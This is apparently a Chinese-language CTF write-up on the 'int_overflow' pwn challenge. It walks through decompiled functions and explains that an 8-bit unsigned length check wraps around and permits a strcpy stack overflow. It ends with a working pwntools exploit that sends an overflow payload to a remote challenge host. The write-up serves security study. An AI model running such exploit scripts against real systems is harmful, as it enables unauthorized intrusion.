---
layout: post
title:  int_overflow
date:   2020-08-20 00:01:01 +0300
image:  2020-08-20-mushroom.jpg
tags:   [ctf,pwn,攻防世界]
---

先运行看看

![]({{site.baseurl}}/img/2020-08-20-run.jpg)

ida打开文件进入主函数查看代码

```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+Ch] [ebp-Ch]

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("---------------------");
  puts("~~ Welcome to CTF! ~~");
  puts("       1.Login       ");
  puts("       2.Exit        ");
  puts("---------------------");
  printf("Your choice:");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 1 )
  {
    login();
  }
  else
  {
    if ( v4 == 2 )
    {
      puts("Bye~");
      exit(0);
    }
    puts("Invalid Choice!");
  }
  return 0;
}
```

main正常，进入login()函数查看

```assembly
char *login()
{
  char buf; // [esp+0h] [ebp-228h]
  char s; // [esp+200h] [ebp-28h]

  memset(&s, 0, 0x20u);
  memset(&buf, 0, 0x200u);
  puts("Please input your username:");
  read(0, &s, 0x19u);
  printf("Hello %s\n", &s);
  puts("Please input your passwd:");
  read(0, &buf, 0x199u);
  return check_passwd(&buf);
}
```

这个函数也正常，read的长度都满足定义的长度。

查看check_passwd()函数

```assembly
char *__cdecl check_passwd(char *s)
{
  char *result; // eax
  char dest; // [esp+4h] [ebp-14h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Invalid Password");
    result = (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    result = strcpy(&dest, s);
  }
  return result;
}
```

dest长度为0x14，strcpy处可以溢出，但是对于s的长度有一个检查

exp

```assembly
from pwn import *

io = remote("220.249.52.133",32813)
payload = "A" * (0x14 + 4) + p32(0x0804868B)
payload = payload.ljust(260, "A")
io.recvuntil("Your choice:")
io.sendline("1")
io.recvuntil("Please input your username:\n")
io.sendline("aaa")
io.recvuntil('your passwd:\n')
io.sendline(payload)
io.interactive()
```

得到flag